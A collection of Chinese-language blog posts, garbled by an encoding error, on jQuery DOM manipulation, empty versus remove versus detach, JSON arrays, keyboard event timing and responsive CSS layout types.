&lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt; 12345678$('&lt;button&gt;', { id: 'myId', class: 'myClass', text: 'click Me', on: { click: () =&gt; console.log('click') }}).prependTo('.container') $('parent').prepend() æŠŠæ±è¥¿æ”¾åˆ°çˆ¶å…ƒç´ è£¡ï¼ˆæœ€å‰é¢ï¼‰ 12345&lt;div class=\"container\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt; 12345678910$('.container').prepend( $('&lt;button&gt;', { id: 'myId', class: 'myClass', text: 'click Me', on: { click: () =&gt; console.log('click') } })) after() æ”¾åˆ°æ—é‚Šï¼ˆå¾Œé¢ï¼‰ 1&lt;div class=\"sibling\"&gt;&lt;/div&gt; 1$('.sibling').after($('&lt;div&gt;after&lt;/div&gt;')) before() æ”¾åˆ°æ—é‚Šï¼ˆå‰é¢ï¼‰ 1&lt;div class=\"sibling\"&gt;&lt;/div&gt; 1$('.sibling').before($('&lt;div&gt;before&lt;/div&gt;')) siblings() é¸å‡ºæ‰€æœ‰çš„å…„å¼Ÿå…ƒç´ ï¼ˆä½†ä¸åŒ…å«è‡ªå·±ï¼‰ 12345678910&lt;div&gt; &lt;button class=\"brother\"&gt;å…„å¼Ÿä¸€&lt;/button&gt; &lt;button&gt;å…„å¼ŸäºŒ&lt;/button&gt; &lt;button&gt;å…„å¼Ÿä¸‰&lt;/button&gt; &lt;button&gt;å…„å¼Ÿå››&lt;/button&gt; &lt;div&gt; å…„å¼Ÿäº” &lt;button&gt;ä¸æ˜¯å…„å¼Ÿ&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; 12// [button, button, button, div]console.log($('.brother').siblings()) next() ä¸‹ä¸€å€‹å…„å¼Ÿå…ƒç´  12345&lt;div&gt; &lt;div&gt;å…„å¼Ÿ&lt;/div&gt; &lt;button class=\"brother\"&gt;å…„å¼Ÿä¸€&lt;/button&gt; &lt;a&gt;å…„å¼Ÿ&lt;/a&gt;&lt;/div&gt; 12// [a]console.log($('.brother').next()) nextAll() å¾Œé¢æ‰€æœ‰çš„å…„å¼Ÿå…ƒç´  1234567&lt;div&gt; &lt;div&gt;å…„å¼Ÿ&lt;/div&gt; &lt;button class=\"brother\"&gt;å…„å¼Ÿä¸€&lt;/button&gt; &lt;a&gt;å…„å¼Ÿ&lt;/a&gt; &lt;section&gt;å…„å¼Ÿ&lt;/section&gt; &lt;article&gt;å…„å¼Ÿ&lt;/article&gt;&lt;/div&gt; 12// [a, section, article]console.log($('.brother').nextAll()) prev() å‰ä¸€å€‹å…„å¼Ÿå…ƒç´  12345&lt;div&gt; &lt;div&gt;å…„å¼Ÿ&lt;/div&gt; &lt;button class=\"brother\"&gt;å…„å¼Ÿä¸€&lt;/button&gt; &lt;a&gt;å…„å¼Ÿ&lt;/a&gt;&lt;/div&gt; 12// [div]console.log($('.brother').prev()) prevAll() å‰é¢æ‰€æœ‰çš„å…„å¼Ÿå…ƒç´  1234567&lt;div&gt; &lt;a&gt;å…„å¼Ÿ&lt;/a&gt; &lt;section&gt;å…„å¼Ÿ&lt;/section&gt; &lt;article&gt;å…„å¼Ÿ&lt;/article&gt; &lt;button class=\"brother\"&gt;å…„å¼Ÿä¸€&lt;/button&gt; &lt;div&gt;å…„å¼Ÿ&lt;/div&gt;&lt;/div&gt; 12// [article, section, a]console.log($('.brother').prevAll()) hasClass(className) æœ‰æ²’æœ‰åŒ…å«é€™å€‹ class jQueryï¼š 12// true / false$('el').hasClass('classNmae') JavaScriptï¼š 1element.classList.contains('className') closest(selector) æ‰¾å‡ºç¬¬ä¸€å€‹ç¬¦åˆé¸å–å™¨çš„çˆ¶å…ƒç´  jQueryï¼š 12// é€™å€‹æœƒå›å‚³ jQuery ç‰©ä»¶$(element).closest('parent') JavaScriptï¼š 12// é€™å€‹å›å‚³ DOM ç¯€é»element.closest('parent') val() è®€å–æˆ–è¨­å®šè¡¨å–®å…ƒç´ çš„ value jQueryï¼š 1234// å–å¾— input çš„å€¼$('input').val();// è¨­å®š input çš„å€¼$('input')val(''); JavaScriptï¼š 1234// å–å¾— input çš„å€¼document.querySelector('input').value// è¨­å®š input çš„å€¼document.querySelector('input').value = '' remove() åˆªé™¤å…ƒç´ ï¼ˆåŒ…å«è‡ªå·±ï¼‰ å’Œ JavaScrip å¹¾ä¹ä¸€æ¨£ï¼š 1$('element').remove() on('event', 'selector', function) äº‹ä»¶ç›£è½å™¨ï¼Œé‡é»æ˜¯ delegate æ¯”è¼ƒæ–¹ä¾¿ï¼š jQueryï¼š 1234// ç›´æ¥ç”¨ç¬¬äºŒå€‹ selector éæ¿¾$('element').on('click', 'child', (e) =&gt; { console.log('click')}) JavaScriptï¼š 123456document.querySelector('element').addEventListener('click', (e) =&gt; { // ç”¨ class åˆ¤å®š if (e.classList.contains('className')) { console.log('click') }}) empty() æ¸…ç©ºæ‰€æœ‰å­å…ƒç´ ï¼ˆå…§å®¹ï¼‰ jQueryï¼š 1$('parent').empty() JavaScriptï¼š 1document.querySelector('parent').innerHTML = '' æˆ–åƒè€ƒï¼šDOM æ¸…é™¤æ‰€æœ‰çš„å­å…ƒç´  serialize() æŠŠè¡¨å–®æ¬„ä½å€¼è½‰æˆ url å­—ä¸²ï¼Œé€šå¸¸ç”¨åœ¨ç”¨ $.ajax å‚³é€è³‡æ–™ï¼š 123456$form = $('.form')$form.on('submit', () =&gt; { const formData = $('.form').serialize() // é€™é‚Šåªæ˜¯ç¤ºæ„ï¼Œè¼¸å‡ºçµæœç‚ºç©ºå­—ä¸²æ˜¯æ­£å¸¸çš„ console.log(formData)}) æ€éº¼è¨­å®š button ç‚º disabled ç”¨ attr 1$('.btn').attr('disabled', 'disabled') ç”¨ propï¼ˆproperty æ¨è–¦ï¼‰ 1$('.btn').prop('disabled', ture) æ€éº¼ç”¨ $.ajax çš„ POST é€è¡¨å–®æ ¼å¼è³‡æ–™è©³ç´°å¯åƒè€ƒ ç”¨ jQuery ç™¼ AJAX 1234567891011// å–å¾—è¡¨å–®çš„å…§å®¹const formData = new FormData($('form'))$.ajax({ url: `https://api.com`, type: 'POST', data: formData, contentType: false, // required processData: false, // required success: (data) =&gt; callback(null, data), error: (err) =&gt; callback(err)}) å»ºç«‹ DOM å…ƒç´ ï¼Œä¸¦æ’å…¥jQuery ä¸ç”¨åƒ JavaScript é‚„è¦ createElementï¼Œè€Œæ˜¯ç›´æ¥ $(&lt;div&gt;&lt;/div&gt;) ä¾†ç”¢ç”Ÿï¼š 12345&lt;div class=\"container\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt; 123$(`&lt;div&gt; &lt;p&gt;yoyoyo&lt;/p&gt; &lt;/div&gt;`).appendTo('.container') ç”šè‡³é‚„å¯ä»¥è¨­å®šå±¬æ€§ã€ç›£è½å™¨ï¼š 12345678910$('&lt;button&gt;', { id: 'myId', class: 'myClass', title: 'myTitle', tooltip: 'è«‹è¼¸å…¥è¨Šæ¯', text: 'Click Me', // ä¸å¯ HTMLï¼Œæœƒè¢«ç•¶ç´”å­—ä¸² on: { click: () =&gt; console.log('click') }}).appendTo('.conainer') append çš„å¦å¤–ä¸€ç¨®ç”¨é€”å¯ä»¥æ‹¿ä¾†ã€Œç§»å‹•å…ƒç´ ã€ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯å…ˆ select ç•«é¢ä¸Šçš„å…ƒç´ ï¼Œå†æŠŠå®ƒ append åˆ°åˆ¥çš„åœ°æ–¹ã€‚ 123456789101112131415161718192021222324252627&lt;style&gt; body { display: flex; justify-content: center; align-items: center; padding-top: 60px; } div { padding: 20px; margin: 20px; } div.box-red { border: 2px solid red; } div.box-blue { border: 2px solid slateblue; }&lt;/style&gt;&lt;div class=\"box-red\"&gt; &lt;ul&gt; &lt;li&gt;item&lt;/li&gt; &lt;li&gt;item&lt;/li&gt; &lt;li&gt;item&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;div class=\"box-blue\"&gt;&lt;/div&gt;&lt;button&gt;Move it.&lt;/button&gt; 123456789$(document).ready(function () { $('button').on('click', function () { if ($('ul').parent().hasClass('box-red')) { $('ul').appendTo($('.box-blue')) } else { $('ul').appendTo($('.box-red')) } })})","link":"/2022/02/23/jquery-note/"},{"title":"jQuery çš„ emptyã€remove å’Œ detach çš„å·®åˆ¥","text":"å°çŸ¥è­˜ã€‚ æ‡¶äººåŒ… empty ä¸ä¿ç•™å…ƒç´ çš„å…§å®¹ remove ä¿ç•™å…ƒç´ å…§å®¹ï¼Œä½†ä¸ä¿ç•™ç›£è½å™¨ detach ä¿ç•™å…ƒç´ å…§å®¹ï¼Œä¸¦ä¿ç•™ç›£è½å™¨ ç°¡è¿°å…¶å¯¦é€™ä¸‰å€‹ method éƒ½æœ‰å›å‚³å€¼ï¼Œå›å‚³å€¼æ˜¯ jQuery ç‰©ä»¶ï¼Œè£¡é¢æœƒå„²å­˜å…ƒç´ çš„ç›¸é—œè³‡è¨Šï¼š HTMLï¼š 123456789&lt;div class=\"div-1\"&gt; &lt;p&gt;Lorem ipsum dolor sit amet conse&lt;/p&gt;&lt;/div&gt;&lt;div class=\"div-2\"&gt; &lt;p&gt;Lorem ipsum dolor sit amet conse&lt;/p&gt;&lt;/div&gt;&lt;div class=\"div-3\"&gt; &lt;p&gt;Lorem ipsum dolor sit amet conse&lt;/p&gt;&lt;/div&gt; 123456const returnValue1 = $('.div-1').empty()const returnValue2 = $('.div-2').remove()const returnValue3 = $('.div-3').detach()console.log(returnValue1[0].innerHTML) // ''console.log(returnValue2[0].innerHTML) // &lt;p&gt;Lorem ipsum dolor sit amet conse&lt;/p&gt;console.log(returnValue3[0].innerHTML) // &lt;p&gt;Lorem ipsum dolor sit amet conse&lt;/p&gt; ä¸‰å€‹éƒ½æœƒä¿ç•™åŸæœ¬ &lt;div&gt; çš„è³‡è¨Šï¼Œä½†å› ç‚º empty çš„ä½œç”¨æ˜¯æŠŠæ‰€æœ‰å…§å®¹çµ¦æ¸…é™¤ï¼Œå› æ­¤ç•™ä¸‹çš„è³‡è¨Šä¹Ÿæœƒæ˜¯ç©ºçš„ã€‚ åˆ©ç”¨é€™é»èƒ½åšåˆ°æŠŠä¸€å€‹å…ƒç´  remove() å¾Œå†æ”¾å›å»ï¼š 123456789&lt;div class=\"div-1\"&gt; &lt;p&gt;Lorem ipsum dolor, sit amet consectetur adipisicing elit&lt;/p&gt;&lt;/div&gt;&lt;div class=\"div-2\"&gt; &lt;p&gt;Lorem ipsum dolor sit amet conse&lt;/p&gt;&lt;/div&gt;&lt;div class=\"div-3\"&gt; &lt;p&gt;Lorem ipsum dolor sit&lt;/p&gt;&lt;/div&gt; 12345678910111213// å„²å­˜å›å‚³å€¼let returnValue1// åˆªé™¤å…ƒç´ $('.btn-getAway').on('click', () =&gt; { returnValue1 = $('.div-1').remove()})// åˆ©ç”¨å›å‚³å€¼ä¾†æ”¾å›å»$('.btn-goBack').on('click', () =&gt; { // å…ˆä¿®æ”¹ &lt;p&gt; çš„å…§å®¹ returnValue1.find('p').text('yo') // å†æ”¾å›å» $('.div-3').before(returnValue1)}) è¼¸å‡ºçµæœï¼š é€™æ¨£çš„å¥½è™•æ˜¯ä¸éœ€è¦é‡æ–°å»ºç«‹å…ƒç´ ï¼ŒåŸæœ¬çš„æµç¨‹æ‡‰è©²æ˜¯ï¼š å…ˆ copy è¦ä¿ç•™çš„å…§å®¹ å»ºç«‹æ–°å…ƒç´  æŠŠ copy çš„å…§å®¹ paste å›æ–°å…ƒç´ è£¡ æ’å› DOM åˆ©ç”¨ä¸Šé¢çš„æ–¹æ³•å¾Œå°±çœäº‹å¤šäº†ï½ remove è·Ÿ detach çš„å·®åˆ¥å…¶å¯¦æœ€ä¸»è¦åªæœ‰ä¸€é»ï¼šæœƒä¸æœƒä¿ç•™ Event Listenerï¼Œå‰è€…æœƒï¼Œå¾Œè€…ä¸æœƒã€‚ç›´æ¥åšå€‹å¯¦é©—ä½ å°±æ‡‚äº†ï¼š ç”¨ remove ç§»é™¤ 123&lt;button class=\"btn-test\"&gt;æ¸¬è©¦ç”¨æŒ‰éˆ•&lt;/button&gt;&lt;button class=\"btn-getAway\"&gt;æ‹¿æ‰&lt;/button&gt;&lt;button class=\"btn-goBack\"&gt;æ”¾å›å»&lt;/button&gt; 1234567891011121314// å„²å­˜å›å‚³è³‡è¨Šlet returnValue// å°è¦ç§»é™¤çš„å…ƒç´ è¨­ç›£è½å™¨$('.btn-test').on('click', () =&gt; { console.log('click!!')})// ç§»é™¤$('.btn-getAway').on('click', () =&gt; { returnValue = $('.btn-test').remove()})// æ”¾å›å»$('.btn-goBack').on('click', () =&gt; { $('.btn-getAway').before(returnValue)}) è¼¸å‡ºçµæœï¼š ç”¨ detach ç§»é™¤ï¼ˆå…¶å¯¦åªå·®åœ¨ä¸€è¡Œï¼‰ 123&lt;button class=\"btn-test\"&gt;æ¸¬è©¦ç”¨æŒ‰éˆ•&lt;/button&gt;&lt;button class=\"btn-getAway\"&gt;æ‹¿æ‰&lt;/button&gt;&lt;button class=\"btn-goBack\"&gt;æ”¾å›å»&lt;/button&gt; 1234567891011121314// å„²å­˜å›å‚³è³‡è¨Šlet returnValue// å°è¦ç§»é™¤çš„å…ƒç´ è¨­ç›£è½å™¨$('.btn-test').on('click', () =&gt; { console.log('click!!')})// ç§»é™¤$('.btn-getAway').on('click', () =&gt; { returnValue = $('.btn-test').detach()})// æ”¾å›å»$('.btn-goBack').on('click', () =&gt; { $('.btn-getAway').before(returnValue)}) çŸ¥é“é€™äº›å°±å·®ä¸å¤šäº†ï¼","link":"/2022/02/25/jquery-remove-empty-detach/"},{"title":"JSON çš„æ ¼å¼ä¹Ÿå¯ä»¥æ˜¯é™£åˆ—","text":"ç¾åœ¨æ‰çŸ¥é“â€¦ çœŸçš„æ˜¯é€™æ¨£å­è©³ç´°å¯ä»¥åƒè€ƒ MDN ä¸Šçš„èªªæ˜ï¼Œä½†ç¸½è€Œè¨€ä¹‹ï¼Œarray ä¹Ÿæ˜¯åˆæ³•çš„ JSON æ ¼å¼è³‡æ–™ï¼š 1234567891011const json = `[ { \"name\": \"PeaNu\", \"age\": 23 }, { \"name\": \"PPB\", \"age\": 24 }]`console.log(JSON.parse(json)) // (2)&nbsp;[{â€¦}, {â€¦}] æˆ–æ˜¯åå…¶é“è€Œè¡Œï¼š 123456789101112const array = [ { name: 'PeaNu', age: 23 }, { name: 'PPB', age: 24 }]console.log(JSON.stringify(array))// expect output: [{\"name\":\"PeaNu\",\"age\":23},{\"name\":\"PPB\",\"age\":24}]","link":"/2022/01/06/json-can-be-an-array/"},{"title":"é—œæ–¼ key-event çš„è§¸ç™¼æ™‚æ©Ÿ","text":"ä»Šå¤©å‰›å¥½è¢«é›·åˆ°ã€‚ ç°¡è¿°åœ¨é¡¯ç¤ºæ–‡å­—ä¹‹å‰è§¸ç™¼ï¼š keypressï¼ˆæœƒé€£çºŒè§¸ç™¼ï¼‰ keydown åœ¨é¡¯ç¤ºæ–‡å­—å¾Œæ‰è§¸ç™¼ï¼š keyup é€™ä¸‰å€‹çš„å·®ç•°è¦ææ¸…æ¥šï¼Œä¸ç„¶å¯« event çš„æ™‚å€™æœƒå‡ºç¾éé æœŸçš„çµæœã€‚","link":"/2022/02/25/key-events/"},{"title":"åœ¨å­¸éŸ¿æ‡‰å¼è¨­è¨ˆå‰ï¼Œä½ æ‡‰è©²å…ˆçŸ¥é“é€™äº›ã€‚","text":"å…¶å¯¦å¯«é€™ç¯‡æ–‡ç« çš„ç†ç”±å¾ˆå–®ç´”ï¼Œå› ç‚ºè‡ªå·±ä»¥å‰åœ¨å­¸ CSS çš„æ™‚å€™ï¼Œæ’éä¸å°‘æ¬¡ç‰†å£ã€‚ç›´åˆ°ç¾åœ¨ï¼Œæˆ‘ä¹Ÿä¸æ•¢ä¿è­‰èªªè‡ªå·±å·²ç¶“å®Œå…¨æŒæ¡ CSS é€™å€‹è®“äººåˆæ„›åˆæ¨çš„æ±è¥¿ã€‚ç‚ºä»€éº¼èªª CSS è®“äººåˆæ„›åˆæ¨ï¼Ÿå› ç‚ºç•¶å®Œæˆä¸€å€‹ç‰ˆé¢æ™‚ï¼Œé‚£ä»½æˆå°±æ„Ÿæ˜¯è®“äººæ„Ÿåˆ°å¾ˆèˆ’æœçš„ï¼Œä¸éè·‘ç‰ˆçš„æ™‚å€™å°±æ˜¯å¦å¤–ä¸€å›äº‹äº†â€¦ ç¸½è€Œè¨€ä¹‹ï¼Œæœ€è¿‘å› ç‚ºæº–å‚™ä½œå“çš„é—œä¿‚ï¼Œå¾—å›ä¾†é‡æ–°å›æº«ä¸€äº› CSS çš„çŸ¥è­˜ã€‚ ç‰¹åˆ¥æ˜¯åœ¨éŸ¿æ‡‰å¼é€™ä¸€å¡Šã€‚æˆ‘æƒ³å„ä½æ‡‰è©²éƒ½å¾ˆæ¸…æ¥šåœ¨é€™å€‹æ™‚ä»£ï¼ŒéŸ¿æ‡‰å¼æ˜¯å€‹ä¸å¯æˆ–ç¼ºçš„æ¢ä»¶å§ã€‚æ‰€ä»¥å°±è®“æˆ‘å€‘å¾æœ€åŸºæœ¬çš„ä½ˆå±€ï¼ˆLayoutï¼‰ä¾†ä¸€å€‹å€‹ä»‹ç´¹å§ã€‚ å°è¦½é›–ç„¶ä¸ä¿è­‰é€™è£¡ä»‹ç´¹çš„ç‰ˆé¢èƒ½å¤ å«æ‹¬æ‰€æœ‰ç¨®é¡ï¼Œä½†æˆ‘æƒ³é€™äº›æ‡‰è©²éƒ½èƒ½ç¨±çš„ä¸Šæ˜¯æ¯”è¼ƒå»£æ³›è·Ÿå¸¸è¦‹çš„é¡å‹ã€‚é€™æ¬¡æœƒä»‹ç´¹çš„ç‰ˆé¢æœ‰é€™äº›ï¼š å›ºå®šå¼ç‰ˆé¢ æµå‹•å¼ç‰ˆé¢ æ¶²æ…‹å¼ç‰ˆé¢ å½ˆæ€§å¼ç‰ˆé¢ æµå‹•å¼æ ¼ç·šç‰ˆé¢ åˆ†æ¬„å¼ç‰ˆé¢ å–®æ¬„å¼ç‰ˆé¢ å¤šæ¬„å¼ç‰ˆé¢ æ ¼ç·šç‰ˆé¢ æ ¼ç·šå¼ç‰ˆé¢ ç„¡æ ¼ç·šå¼ç‰ˆé¢ è¤‡åˆå¼ç‰ˆé¢ éŸ¿æ‡‰å¼ç‰ˆé¢ é©æ‡‰å¼ç‰ˆé¢ å›ºå®šå¼ç‰ˆé¢ é¡§åæ€ç¾©ï¼Œæ•´å€‹ç¶²é çš„å¯¬åº¦éƒ½æœƒæ˜¯å›ºå®šçš„ï¼Œä¸¦ä¸”ä»¥ ã€Œpxã€ ä¾†ä½œç‚ºå–®ä½ã€‚é€™æ˜¯æœ€å¥½ç†è§£ä¹Ÿæ˜¯æœ€ç°¡å–®çš„æ–¹å¼ï¼Œä¸éå¤§éƒ¨åˆ†åªæœ‰åœ¨ä¸€é–‹å§‹åˆ‡å‡ºç‰ˆé¢æ™‚ï¼Œæ‰æœƒæš«æ™‚å…ˆé€™æ¨£ä½¿ç”¨ã€‚ Codepenï¼š See the Pen å›ºå®šå¼ç‰ˆé¢ by jim (@jubeatt) on CodePen. ï¼ˆå¦‚æœä½ å¾ˆæ‡¶å¾—é–‹æ–°è¦–çª—ï¼Œéº»ç…© 0.25x çµ¦ä»–é»ä¸‹å»ï¼‰ æµå‹•å¼ç‰ˆé¢æµå‹•å¼ç‰ˆé¢æœ€å¤§çš„ç‰¹é»å°±æ˜¯ï¼Œä¸€å€‹å€å¡Šæœƒæœ‰ ã€Œä¼¸ç¸®ï¼ˆæµå‹•ï¼‰ã€ çš„æ•ˆæœï¼Œæ‰€ä»¥æœƒæ”¹ä»¥ ã€Œ%ã€ï¼ˆä¹Ÿæœ‰äººç”¨ã€Œemã€ï¼‰ ä¾†ä½œç‚ºå–®ä½ã€‚ è€Œæµå‹•å¼ç‰ˆé¢åˆå¯ä»¥åœ¨åˆ†æˆï¼š æ¶²æ…‹å¼ç‰ˆé¢ï¼ˆå…¨ç¨‹éƒ½ä½¿ç”¨%ï¼‰ å½ˆæ€§å¼ç‰ˆé¢ï¼ˆé™¤äº† % ä»¥å¤–ï¼Œå†åŠ ä¸Š min-width / max-width ä¾†æ§åˆ¶æœ€å¤§èˆ‡æœ€å°ç¯„åœï¼‰ æµå‹•å¼æ ¼ç·šç‰ˆé¢ï¼ˆ% æ··åˆ pxï¼‰ æ¶²æ…‹å¼ç‰ˆé¢ æ•´å€‹ç‰ˆé¢å°±åƒæ°´ä¸€æ¨£éå¸¸æµå‹•ï¼Œé€™æ¨£çš„å¥½è™•æ˜¯èƒ½å¤ éš¨è‘—è¦–çª—ä¾†åšä¼¸ç¸®ï¼Œä¸æœƒæœ‰å‡ºç¾æ»¾è»¸çš„æƒ…æ³ç™¼ç”Ÿã€‚ ä½†æœ‰ä¸€å€‹å•é¡Œæ˜¯ï¼Œç•¶ ã€Œè¦–çª—å¾ˆå¤§ / å¾ˆå°ã€ æ™‚ï¼Œç•«é¢å°±æœƒè®Šå¾—å¤ªç·Šç¹ƒæˆ–å¤ªå¯¬æ•ï¼Œå°è‡´æ•´å€‹ç¶²é çœ‹èµ·ä¾†æ€ªæ€ªçš„ã€‚ Codepenï¼š See the Pen æ¶²æ…‹å¼ç‰ˆé¢ by jim (@jubeatt) on CodePen. ï¼ˆä½ å¯ä»¥åˆ°Codepaenè£¡å»èª¿æ•´å¼è¦–çª—ï¼Œä¾†è§€å¯Ÿ\"æµå‹•\"çš„æ•ˆæœï¼ï¼‰ å½ˆæ€§å¼ç‰ˆé¢ é€™å€‹ç‰ˆé¢æ˜¯ç‚ºäº†è§£æ±ºæ¶²æ…‹å¼ç‰ˆé¢ä¸­ã€Œè¦–çª—å¾ˆå¤§ / å¾ˆå°ã€çš„å•é¡Œï¼Œé€™è£¡åˆ©ç”¨äº†å…©å€‹ CSS å±¬æ€§ï¼š min-widthï¼ˆæœ€å°å¯¬åº¦ï¼‰ max-widthï¼ˆæœ€å¤§å¯¬åº¦ï¼‰ ç°¡å–®ä¾†èªªï¼š ç•¶ä¸€å€‹å€å¡Šçš„å¯¬åº¦ &lt; min-widthæ™‚ï¼Œå¯¬åº¦æœƒå›ºå®šåœ¨min-widthè¨­å®šçš„å€¼ï¼Œç•¶ä¸€å€‹å€å¡Šçš„å¯¬åº¦ &gt; max-widthæ™‚ï¼Œå¯¬åº¦æœƒå›ºå®šåœ¨max-widthè¨­å®šçš„å€¼ã€‚ ç•¶é€™æ¨£å­è¨­å®šå¾Œï¼Œå°±èƒ½ç¢ºä¿ç‰ˆé¢åœ¨é™åˆ¶çš„ç¯„åœä¸­ä¼¸ç¸®ï¼Œé¿å…æ¥µç«¯å€¼çš„ç‹€æ³ã€‚ Codepenï¼š See the Pen å½ˆæ€§ç‰ˆé¢ by jim (@jubeatt) on CodePen. ï¼ˆé€™è£¡å»ºè­°æ­é…é–‹ç™¼è€…å·¥å…·ä¸­çš„box-modalä¾†è§€å¯Ÿwidthçš„å€¼ï¼Œæœƒæ›´æ¸…æ¥šï¼ï¼‰ æµå‹•å¼æ ¼ç·šç‰ˆé¢ ä½ å¯ä»¥æŠŠé€™ç¨®ç‰ˆé¢ç•¶ä½œæ˜¯ä¸€ç¨®ã€Œæ··åˆã€çš„æ¦‚å¿µã€‚é€™ç¨®é¡å‹çš„ç‰ˆé¢æœƒè®“å¤–å±¤å®¹å™¨ ã€Œæµå‹•ï¼ˆ%ï¼‰ã€ï¼Œå…§å®¹å€å¡Š ã€Œå›ºå®šï¼ˆpxï¼‰ã€ã€‚å°‡é€™å…©è€…æ··åˆï¼Œå†é€é CSS çš„æ’ç‰ˆè¨­è¨ˆï¼Œå°±èƒ½åšå‡º ã€Œéš¨è‘—å¯¬åº¦ç”¢ç”Ÿä¸åŒæ•¸é‡çš„æ¬„ä½å€å¡Šã€ é€™ç¨®æ•ˆæœï¼ Codepenï¼š See the Pen æµå‹•å¼æ ¼ç·šç‰ˆé¢ by jim (@jubeatt) on CodePen. ï¼ˆæ‡¶å¾—é–‹æ–°åˆ†é çš„è©±å°±æŒ‰å€‹ 1x 0.5x 0.25x å§ï¼‰ åˆ†æ¬„å¼ç‰ˆé¢äº†è§£ä¸Šé¢çš„æ¦‚å¿µå¾Œï¼Œä½ å°±èƒ½åˆ©ç”¨å®ƒå€‘åšå‡ºä¸€å€‹ç°¡å–®çš„ç‰ˆå‹å›‰ï¼ä¸ç”¨æƒ³çš„å¤ªè¤‡é›œï¼Œä¸»è¦å°±åªæ˜¯çš„ã€Œå–®æ¬„ / å¤šæ¬„ã€çš„å·®åˆ¥è€Œå·²ã€‚è€Œå¤§å¤šæ•¸æœƒä½¿ç”¨å–®æ¬„çš„æƒ…æ³æ˜¯ç‚ºäº†ã€Œæ‰‹æ©Ÿç‰ˆé¢ã€çš„éœ€æ±‚ï¼ˆç•¢ç«Ÿæ‰‹æ©Ÿçš„å¯¬åº¦æœ‰é™å˜›ï¼ï¼‰ï¼Œè‡³æ–¼å¤šæ¬„å¤§éƒ¨åˆ†æ˜¯çµ¦ã€Œé›»è…¦ç‰ˆ / å¹³æ¿ã€çš„éœ€æ±‚å›‰ï¼ ä¸éé€™åªæ˜¯å¤§éƒ¨åˆ†ï¼Œä¸ä»£è¡¨ä¸€å®šæ˜¯ç…§è‘—é€™å€‹è¦å‰‡ã€‚ç¸½è€Œè¨€ä¹‹ï¼Œé‚„æ˜¯è¦çœ‹ä¸€å€‹ç¶²é çš„é¢¨æ ¼å–å‘èˆ‡ä½¿ç”¨éœ€æ±‚ä¾†æ±ºå®šè©²æ€éº¼åˆ†å‰²ã€‚ å–®æ¬„å¼ç‰ˆé¢ ç—¾â€¦å…¶å¯¦å°±æ˜¯ä¸€å€‹ä½ ç”¨æ‰‹æ©Ÿå»å¤§éƒ¨åˆ†çš„ç¶²ç«™éƒ½èƒ½çœ‹åˆ°çš„å–®æ¬„ç‰ˆé¢é€™æ¨£ã€‚çµ•å°æ²’æœ‰ç§è—ä»€éº¼æ’‡æ­¥ï¼éƒ½æ˜¯å‰é¢è¬›éçš„æ¦‚å¿µï¼Œæœ‰èˆˆè¶£çš„äººä¹Ÿå¯ä»¥è‡ªå·±è©¦è©¦çœ‹ã€‚ Codepenï¼š See the Pen å–®æ¬„å¼ç‰ˆé¢ by jim (@jubeatt) on CodePen. å¤šæ¬„å¼ç‰ˆé¢ ä¸€æ¨£æ˜¯ä¸€å€‹åŸºæœ¬çš„å…©æ¬„ç‰ˆé¢ï¼Œä½¿ç”¨äº†æœƒæš´éœ²å¹´é½¡çš„ã€Œfloatã€ä¾†æ’ç‰ˆã€‚ï¼ˆå–‚åªè¦ä½ æœƒå…©æ¬„çš„è©±ï¼Œé‚£ä¸‰æ¬„ã€å››æ¬„ã€å…«åä¸ƒæ¬„ï¼Œæ‡‰è©²éƒ½ä¸æœƒæœ‰ä»€éº¼å¤ªå¤§çš„å•é¡Œï¼Œæ‰€ä»¥é€™è£¡å°±ä¸å†å¤šåšç¤ºç¯„äº†ã€‚ Codepenï¼š See the Pen å…©æ¬„å¼ç‰ˆé¢ by jim (@jubeatt) on CodePen. æ ¼ç·šç‰ˆé¢æ ¼ç·šå¼ç‰ˆé¢ å¦‚æœè¦ç”¨ä¸€å¥ç°¡å–®ä¾†èªªæ˜ä»€éº¼æ˜¯æ ¼ç·šï¼Œæˆ‘æœƒèªªæ˜¯ ã€Œæ’æ ¼å­ã€ã€‚å› ç‚ºé€™ç¨®ç‰ˆé¢å…¶å¯¦å°±æ˜¯ç”¨å¾ˆå¤šçš„æ ¼å­ä¸€å€‹å€‹æ’å¥½ã€æ”¾å¥½ï¼Œå¼„æˆä½ æƒ³è¦çš„ç•«é¢ã€‚ è€Œç¶²æ ¼ç³»çµ±åŸºæœ¬ä¸Šæœƒå…ˆè¨­å®šå¥½åˆå§‹æ•¸å€¼ï¼Œåƒæ˜¯ï¼š ç¸½å…±æœ‰å¹¾å€‹æ¬„ï¼Ÿï¼ˆç›´æ’ï¼‰ ä¸€è¡Œæœ‰å¤šå¯¬ï¼Ÿï¼ˆæ©«æ’ï¼‰ ä¸€æ¬„æœ‰å¤šå¯¬ï¼Ÿï¼ˆç›´æ’ï¼‰ æ¬„èˆ‡æ¬„ä¹‹é–“çš„é–“è·è¦å¤šå°‘ï¼Ÿ å¦‚æœä»¥ä¸Šé¢çš„åœ–ç‰‡ä¾†çœ‹çš„è©±ï¼š ç¸½å…±æœ‰ 12 æ¬„ ä¸€è¡Œçš„å¯¬åº¦ç‚º: 940px ä¸€æ¬„çš„å¯¬åº¦ : 60px æ¬„èˆ‡æ¬„ä¹‹é–“çš„é–“è· : 20px æ‰€ä»¥å‡è¨­æˆ‘å¸Œæœ›åˆ‡å‡ºå…©å€‹å€å¡Šï¼Œé‚£å°±æœƒæ˜¯ï¼š ã€Œç¬¬ä¸€å€‹å€å¡Šè¦ä½” 6 æ¬„ã€ç¬¬äºŒå€‹å€å¡Šè¦ä½” 6 æ¬„ã€ æ‰€ä»¥å…©å€‹å€å¡Šæœƒå„è‡ªä½”æ“š 460px çš„å¯¬åº¦ï¼ˆå…­å€‹æ¬„å¯¬: 60 x 6 + äº”å€‹é–“è·: 20 x 5ï¼‰ å¦‚æœé‚„æ˜¯ä¸å¤ªæ¸…æ¥šçš„è©±ä½ 